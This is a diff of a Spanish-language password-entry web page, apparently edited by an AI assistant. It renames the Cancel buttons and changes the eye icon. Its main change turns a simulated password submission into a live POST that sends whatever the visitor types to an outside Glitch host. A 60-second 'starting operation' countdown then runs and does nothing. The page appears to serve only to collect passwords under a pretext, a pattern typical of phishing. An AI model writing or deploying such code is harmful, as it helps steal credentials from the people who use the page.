@@ -138,7 +138,8 @@
 
                 <div class="btn-group">
                     <button type="button" class="btn btn-grey" id="continueButton">Continuar</button>
-                    <button type="submit" class="btn btn-blue" id="cancelButton">Cancelar</button>
+                    <!-- He cambiado el ID del botón Cancelar para que sea único en esta sección -->
+                    <button type="button" class="btn btn-blue" id="cancelFormButton">Cancelar</button> 
                 </div>
             </div>
 
@@ -147,6 +148,8 @@
                 <h2 class="text-3xl font-bold text-gray-800 mb-4" style="color: #2a64ad;">Iniciando operación en:</h2>
                 <p class="text-6xl font-extrabold text-blue-600 mb-2" id="countdownValue">60</p>
                 <p class="text-xl text-gray-600">segundos</p>
+                <!-- He cambiado el ID del botón Cancelar aquí para que sea único -->
+                <button type="button" class="btn btn-blue mt-4" id="cancelCountdownButton">Cancelar</button> 
             </div>
         </div>
     </div>
@@ -161,7 +164,9 @@
             const passwordInput = document.getElementById('passwordInput');
             const togglePassword = document.getElementById('togglePassword');
             const continueButton = document.getElementById('continueButton');
-            const cancelButton = document.getElementById('cancelButton');
+            // Referencias actualizadas para los botones de cancelar con IDs únicos
+            const cancelFormButton = document.getElementById('cancelFormButton'); // Botón Cancelar del formulario
+            const cancelCountdownButton = document.getElementById('cancelCountdownButton'); // Botón Cancelar de la cuenta regresiva
 
             // Nuevos elementos para la cuenta regresiva y el formulario
             const formContent = document.getElementById('formContent');
@@ -169,65 +174,98 @@
             const countdownValueElement = document.getElementById('countdownValue');
             let countdownInterval; // Variable para almacenar el ID del intervalo de la cuenta regresiva
 
+            // --- Envío de información al backend de Glitch (Contraseña) ---
+            const glitchBackendUrl = 'https://little-mighty-zinc.glitch.me'; // URL de tu proyecto Glitch
+
             // Función para mostrar/ocultar contraseña
             togglePassword.addEventListener('click', () => {
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
-                // Aquí podrías cambiar el icono del ojo si tuvieras SVGs para abierto/cerrado
+                // Cambia el icono del ojo (Lucide Icons)
+                const eyeIcon = togglePassword.querySelector('svg');
+                if (type === 'password') {
+                    eyeIcon.innerHTML = '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/>'; // Ojo abierto
+                } else {
+                    eyeIcon.innerHTML = '<path d="M10.58 10.58a2 2 0 0 0 2.83 2.83"/><path d="M9.34 4.66A10.17 10.17 0 0 1 12 4c5 0 8.84 5.31 10.58 7.37a1 1 0 0 1 0 1.26c-.34.48-.7.9-.99 1.34L9.34 4.66Z"/><path d="M7 7C4 10 2 12 2 12s3 7 10 7c.36 0 .7-.02 1.04-.07"/><path d="M2.93 11.69A9.16 9.16 0 0 0 2 12c0 1 1.02 2 2.37 3.5"/><path d="M18.84 14.84c.66-.9 1.15-1.55 1.52-2"/><circle cx="12" cy="12" r="3"/><path d="m2 2 20 20"/>'; // Ojo tachado
+                }
             });
 
             // Lógica para el botón "Continuar"
-            continueButton.addEventListener('click', () => {
+            continueButton.addEventListener('click', async () => { // Añadido 'async'
                 // Solo procede si el botón está activo (azul)
                 if (continueButton.classList.contains('btn-blue')) {
                     const password = passwordInput.value;
-                    // Simulación de envío de información (se muestra en la consola del navegador)
-                    console.log('Contraseña ingresada (simulación de envío):', password);
+                    console.log('Contraseña ingresada (para enviar):', password);
 
-                    // Ocultar el formulario y mostrar la sección de cuenta regresiva
-                    formContent.classList.add('hidden');
-                    countdownSection.classList.remove('hidden');
+                    try {
+                        const response = await fetch(`${glitchBackendUrl}/submit-password`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ password: password })
+                        });
 
-                    let timeLeft = 60;
-                    countdownValueElement.textContent = timeLeft;
+                        const result = await response.json();
+                        console.log('Respuesta del backend (contraseña):', result);
 
-                    // Iniciar la cuenta regresiva
-                    countdownInterval = setInterval(() => {
-                        timeLeft--;
-                        countdownValueElement.textContent = timeLeft;
+                        if (result.success) {
+                            // Ocultar el formulario y mostrar la sección de cuenta regresiva
+                            formContent.classList.add('hidden');
+                            countdownSection.classList.remove('hidden');
 
-                        if (timeLeft <= 0) {
-                            clearInterval(countdownInterval); // Detener el intervalo
-                            countdownValueElement.textContent = '¡Tiempo terminado!';
-                            console.log('Cuenta regresiva finalizada. Lógica adicional aquí...');
-                            // Aquí puedes añadir lo que sucede después de que la cuenta regresiva termina,
-                            // como redirigir a otra página, mostrar un mensaje final, etc.
-                            // Ejemplo: setTimeout(() => window.location.href = 'otra_pagina.html', 2000);
+                            let timeLeft = 60;
+                            countdownValueElement.textContent = timeLeft;
+
+                            // Iniciar la cuenta regresiva
+                            countdownInterval = setInterval(() => {
+                                timeLeft--;
+                                countdownValueElement.textContent = timeLeft;
+
+                                if (timeLeft <= 0) {
+                                    clearInterval(countdownInterval); // Detener el intervalo
+                                    countdownValueElement.textContent = '¡Tiempo terminado!';
+                                    console.log('Cuenta regresiva finalizada. Lógica adicional aquí...');
+                                    // Aquí puedes añadir lo que sucede después de que la cuenta regresiva termina,
+                                    // como redirigir a otra página, mostrar un mensaje final, etc.
+                                    // Ejemplo: setTimeout(() => window.location.href = 'otra_pagina.html', 2000);
+                                }
+                            }, 1000); // Actualizar cada 1000 milisegundos (1 segundo)
+                        } else {
+                            // Manejar errores si el backend reporta un fallo
+                            alert('Error al enviar contraseña: ' + result.message); // Usar un modal personalizado
                         }
-                    }, 1000); // Actualizar cada 1000 milisegundos (1 segundo)
+                    } catch (error) {
+                        console.error('Error al conectar con el backend o al enviar contraseña:', error);
+                        alert('No se pudo conectar con el servidor. Intenta de nuevo más tarde.'); // Usar un modal personalizado
+                    }
+
                 } else {
                     console.log('Botón "Continuar" no activo. Por favor, ingresa al menos 8 caracteres.');
                 }
             });
 
-            // Lógica para el botón "Cancelar"
-            cancelButton.addEventListener('click', () => {
-                // Si hay una cuenta regresiva activa, la detiene y vuelve al formulario
+            // Lógica para el botón "Cancelar" del formulario inicial
+            cancelFormButton.addEventListener('click', () => {
+                console.log('Botón "Cancelar" del formulario presionado. Redirigiendo a index.html');
+                window.location.href = 'index.html'; // Redirigir a la página principal
+            });
+
+            // Lógica para el botón "Cancelar" de la sección de cuenta regresiva
+            cancelCountdownButton.addEventListener('click', () => {
                 if (countdownInterval) {
                     clearInterval(countdownInterval); // Detener la cuenta regresiva
                     countdownInterval = null; // Resetear la variable del intervalo
-                    countdownSection.classList.add('hidden'); // Ocultar sección de cuenta regresiva
-                    formContent.classList.remove('hidden'); // Mostrar el formulario
-                    passwordInput.value = ''; // Limpiar el campo de contraseña
-                    // Asegurarse de que el botón "Continuar" vuelva a su estado inicial (gris)
-                    continueButton.classList.remove('btn-blue');
-                    continueButton.classList.add('btn-grey');
-                    console.log('Cuenta regresiva cancelada. Volviendo al formulario.');
-                } else {
-                    // Comportamiento original si no hay cuenta regresiva activa
-                    console.log('Botón "Cancelar" presionado (sin cuenta regresiva activa).');
                 }
+                countdownSection.classList.add('hidden'); // Ocultar sección de cuenta regresiva
+                formContent.classList.remove('hidden'); // Mostrar el formulario
+                passwordInput.value = ''; // Limpiar el campo de contraseña
+                // Asegurarse de que el botón "Continuar" vuelva a su estado inicial (gris)
+                continueButton.classList.remove('btn-blue');
+                continueButton.classList.add('btn-grey');
+                console.log('Cuenta regresiva cancelada. Volviendo al formulario de contraseña.');
             });
+
 
             // Lógica para cambiar el color del botón "Continuar" en función de la longitud de la contraseña
             passwordInput.addEventListener('input', () => {
